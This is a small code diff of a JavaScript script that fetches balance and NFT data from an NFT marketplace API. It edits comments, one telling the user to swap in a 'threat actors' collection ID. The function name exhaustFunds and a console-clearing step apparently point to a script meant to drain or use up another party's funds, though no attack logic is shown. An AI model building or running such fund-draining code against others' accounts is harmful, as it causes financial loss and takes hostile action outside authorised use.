@@ -1,6 +1,6 @@
 getData = async () => {
   // urls
-  cid = "89389edd "; // Beam Apes CID
+  cid = "89389edd "; // Beam Apes CID (replace with threat actors collection ID)
 
   // fetch balance data
   const balance = await fetch("https://api.beamnft.art/user/get", {
@@ -30,7 +30,7 @@ exhaustFunds = (balance, nfts) => {
   let walletBalance = balance;
   console.clear(); // sanitize console
 
-  //   console.log(walletBalance);
+  // console.log(walletBalance);
   console.log(nfts);
 };
 
